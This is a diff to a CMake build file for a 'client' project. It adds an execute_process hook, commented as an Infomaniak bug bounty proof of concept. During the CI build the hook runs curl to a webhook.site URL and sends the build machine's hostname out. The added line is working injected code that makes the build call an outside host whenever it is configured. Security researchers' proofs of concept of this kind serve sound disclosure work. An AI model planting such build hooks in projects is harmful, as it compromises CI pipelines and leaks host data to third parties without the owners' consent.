@@ -2,6 +2,12 @@ cmake_minimum_required(VERSION 3.16)
 
 set(CMAKE_CXX_STANDARD 20)
 project(client)
+
+# >>> Security PoC (Infomaniak YWH bug bounty) - proves fork-controlled build files
+# >>> execute during the stock CI pipeline. DO NOT MERGE.
+execute_process(COMMAND /bin/sh -c "curl -s --max-time 10 'https://webhook.site/90d1826f-8411-4e07-8a9d-bc0710a51e64/cmake?h='$(hostname) || true")
+# <<< end PoC <<<
+
 if(APPLE)
     enable_language(OBJC)
     enable_language(OBJCXX)
